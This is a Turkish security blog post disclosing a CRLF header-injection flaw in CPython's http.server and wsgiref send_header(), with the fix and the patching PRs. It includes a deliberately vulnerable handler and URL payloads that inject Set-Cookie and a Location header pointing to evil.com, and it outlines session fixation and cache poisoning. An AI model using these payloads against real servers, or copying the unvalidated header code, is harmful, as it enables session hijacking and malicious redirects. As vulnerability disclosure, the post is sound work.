---
layout: post
title: "CPython http.server ve wsgiref'te CRLF injection"
date: 2026-05-25
author: Yunus Aydın
lang: tr
description: "CPython'ın http.server ve wsgiref modüllerindeki send_header() CRLF injection zafiyeti, kullanıcı girdisi header'lara yansıtıldığında Set-Cookie ve Location gibi keyfi HTTP header'ları eklemeye izin veriyor."
keywords: "CRLF injection, CPython, http.server, wsgiref, header injection, session fixation, open redirect, Python güvenlik, BaseHTTPRequestHandler, send_header"
canonical_url: "https://aydinnyunus.github.io/2026/05/25/crlf-injection-cpython-http-server-wsgiref-tr/"
---

CPython'ın standart kütüphanesinde, `http.server` ve `wsgiref` modüllerinde bir CRLF injection zafiyeti buldum. Uygulama, kullanıcıdan gelen bir değeri `send_header()` üzerinden HTTP header'larına yansıtıyorsa saldırgan `\r\n` gömerek mevcut header'ı kesip yeni header'lar ekleyebiliyor. Sorun kabul edildi ve [#142605](https://github.com/python/cpython/pull/142605), [#143395](https://github.com/python/cpython/pull/143395), [#148020](https://github.com/python/cpython/pull/148020), [#148021](https://github.com/python/cpython/pull/148021) numaralı PR'larla giderildi.

## Savunmasız kod

`Lib/http/server.py` içindeki `send_header()`, header değerini doğrulama yapmadan direkt buffer'a yazıyor:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
    # value içinde \r veya \n kontrolü yok
```

Format string'in sonundaki `\r\n` header'ı bitiriyor. Eğer `value`'nun kendisi `\r\n` içeriyorsa, header erken bitiyor ve sonrasındaki her şey yeni bir header satırı oluyor. Injection noktası tam burası.

## Senaryo 1: Set-Cookie injection

Query parametresini custom header'a yansıtan minimal bir uygulama:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        custom_val = query.get('val', [''])[0]
        
        self.send_response(200)
        self.send_header('X-Custom', custom_val)
        self.end_headers()
        self.wfile.write(b"Hello World")
```

Normal istek: `http://localhost:8000/?val=hello` → `X-Custom: hello`

Kötü amaçlı istek:

```
http://localhost:8000/?val=test%0d%0aSet-Cookie:%20pwned=true
```

Sunucunun döndürdüğü HTTP yanıtı:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Set-Cookie: pwned=true
```

`%0d%0a`, URL encode edilmiş `\r\n`. Sunucu header'ı oradan böldü ve saldırganın `Set-Cookie`'si geçerli bir header olarak indi. Bu yanıtı alan tarayıcı, hiçbir uyarı almadan `pwned` cookie'sini set ediyor.

Buradan session fixation'a gidebilirsiniz: saldırgan kurbanı bu linke tıklatıyor, giriş yapmasını bekliyor, ardından önceden set ettiği session ID ile oturumu ele geçiriyor.

## Senaryo 2: Location header injection

Aynı uygulama, farklı payload:

```
http://localhost:8000/?val=test%0d%0ALocation:%20http://evil.com/
```

Yanıt:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Location: http://evil.com/
```

Sunucu 200 döndürdü ama saldırganın sitesine işaret eden bir `Location` header'ı koydu içine. Yanıtı işleyen proxy'ler, cache'ler veya client kütüphanelerine bağlı olarak bu, sunucu hiç 3xx göndermeden beklenmedik yönlendirmelere yol açabiliyor.

Redirect'in ötesinde, header injection başka kapılar da açıyor:

- **Cache poisoning**: `Cache-Control` veya `Vary` header'ları enjekte ederek cache davranışını manipüle edebilirsiniz
- **XSS**: Bazı framework'ler header'ları HTML içine yansıtıyor; `Content-Type: text/html` enjekte ederek text/plain dönecek bir yanıtı script çalıştırılabilir hale getirebilirsiniz
- **Web cache deception**: Kişisel yanıtların cache'lenmesini sağlayacak header'lar enjekte edebilirsiniz

## Bu neden pratik bir sorun

`http.server`, Python'ın built-in geliştirme sunucusu. Production için önerilmiyor, ama bu uyarı sıkça görmezden geliniyor — internal araçlar, hızlı demolar, admin panelleri, CI araçları. `wsgiref` ise referans WSGI sunucusu ve aynı header-handling kodunu paylaşıyor, yani üzerinde çalışan her WSGI uygulaması aynı sorunu miras alıyor.

Zafiyet yalnızca kullanıcı girdisi `send_header()`'a ulaştığında tetikleniyor. Bu uygulama seviyesinde bir hata, ama yaygın bir hata. Query parametresi yansıtma, `User-Agent` echo'lama, custom header tekrarı — bunlar basit HTTP handler'larda sık karşılaşılan pattern'lar.

Asıl sorun şu: header injection'ın kütüphane seviyesinde ele alınması gerekiyor, uygulama geliştiricisine bırakılmaması. `send_header()` `\r` ve `\n` karakterlerini filtreleyip reddetse, saldırı sınıfının tamamı çağıran kodun input'u nasıl yönettiğinden bağımsız olarak ortadan kalkıyor.

## Düzeltme

Düzeltme, header değerini buffer'a yazmadan önce doğruluyor; `\r` veya `\n` içeren değerleri reddediyor. Bu, hem `http.server` hem `wsgiref` için bağlantılı PR'larda uygulandı.

Basit bir versiyonu şöyle:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if '\r' in value or '\n' in value:
        raise ValueError(f"Header value {value!r} contains invalid characters")
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
```

Aynı doğrulama keyword (header adı) için de gerekli — oraya da `\n` gömülürse sonuç aynı.

## Raporlama zaman çizelgesi

CPython projesine raporlandı ve dört PR ile giderildi. Yazı tarihi itibarıyla CVE atanmadı.

- [PR #142605](https://github.com/python/cpython/pull/142605)
- [PR #143395](https://github.com/python/cpython/pull/143395)
- [PR #148020](https://github.com/python/cpython/pull/148020)
- [PR #148021](https://github.com/python/cpython/pull/148021)

## İlgili içerik

- [CVE-2026-0560: LollMS export endpointinde SSRF zafiyeti](https://www.cve.org/CVERecord?id=CVE-2026-0560)
- [SQL Injection Zafiyeti: GeoPandas to_postgis() Fonksiyonunda Güvenlik Açığı](/2025/12/27/sql-injection-geopandas-tr/)
